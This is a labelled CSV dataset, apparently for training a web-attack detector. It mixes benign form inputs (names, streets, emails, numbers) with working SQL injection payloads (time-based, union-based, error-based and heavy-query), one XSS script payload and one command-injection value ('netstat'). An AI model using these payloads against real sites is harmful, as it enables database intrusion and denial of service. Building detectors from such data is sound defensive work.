payload,length,attack_type,label
goodman4,8,norm,norm
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and 'kwhs' like 'kwhs",127,sqli,anom
kinsey@etnics.fm,16,norm,norm
calle magnolia 157,18,norm,norm
82452687x,9,norm,norm
1' in boolean mode) and 4595=4595#,34,sqli,anom
forn gndara,11,norm,norm
orejana,7,norm,norm
9366,4,norm,norm
"1%"";select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",88,sqli,anom
girones,7,norm,norm
712,3,norm,norm
03814,5,norm,norm
6646364867316406,16,norm,norm
6721,4,norm,norm
"calle condor, 193 10f",21,norm,norm
1) where 1402=1402;select sleep(5)#,35,sqli,anom
15008,5,norm,norm
bucardo,7,norm,norm
"1"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (((""khuw"" like ""khuw",116,sqli,anom
37439,5,norm,norm
<!-- -- --><script>alert('xss');</script><!-- -- -->,52,xss,anom
nayme,5,norm,norm
"-9171) union all select 6880,6880,6880,6880,6880,6880,6880#",59,sqli,anom
"1%"";select like('abcdefg',upper(hex(randomblob(500000000/2))))--",64,sqli,anom
75817612k,9,norm,norm
storgaard-szibo3@elreversotenebroso.ky,38,norm,norm
montseny,8,norm,norm
fundamentalmente,16,norm,norm
fuente encalada,15,norm,norm
"1')) or 8156=(select count(*) from generate_series(1,5000000))--",64,sqli,anom
"1"")) as ycvh where 4523=4523 and sleep(5)#",42,sqli,anom
"1"") or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""kzcd""=""kzcd",161,sqli,anom
"1"");waitfor delay '0:0:5' and (""ludp"" like ""ludp",48,sqli,anom
1%');select sleep(5) and ('%'=',31,sqli,anom
1);select pg_sleep(5)--,23,sqli,anom
8554607392278464,16,norm,norm
georgian,8,norm,norm
;netstat -a;,12,cmdi,anom
mitchum@prestoesesto.gd,23,norm,norm
1) where 9446=9446 union all select null#,41,sqli,anom
18670,5,norm,norm
0452635229820629,16,norm,norm
basta,5,norm,norm
junquera,8,norm,norm
67872602q,9,norm,norm
"-8369"")) union all select 2191--",32,sqli,anom
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('peyy'='peyy",119,sqli,anom
"1"" where 8672=8672 union all select null,null#",46,sqli,anom
1272,4,norm,norm
61z,3,norm,norm
16537,5,norm,norm
regenta,7,norm,norm
caryn,5,norm,norm
gutierrez@sutelefono.cx,23,norm,norm
1%')));begin user_lock.sleep(5); end and ((('%'=',49,sqli,anom
moreras sort,12,norm,norm
quilolitr-o,11,norm,norm
"travesia calleja encina, 199 11?d",33,norm,norm
"-9297) union all select 6841,6841,6841,6841,6841--",50,sqli,anom
"-9514)) as xdkw where 4975=4975 union all select 4975,4975,4975,4975#",69,sqli,anom
benidoleig,10,norm,norm
380lea,6,norm,norm
denys,5,norm,norm
bayarri bach,12,norm,norm
"1'+(select 'vbqo' where 5630=5630 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",124,sqli,anom
beverly.lormer@decobiombo.ni,28,norm,norm
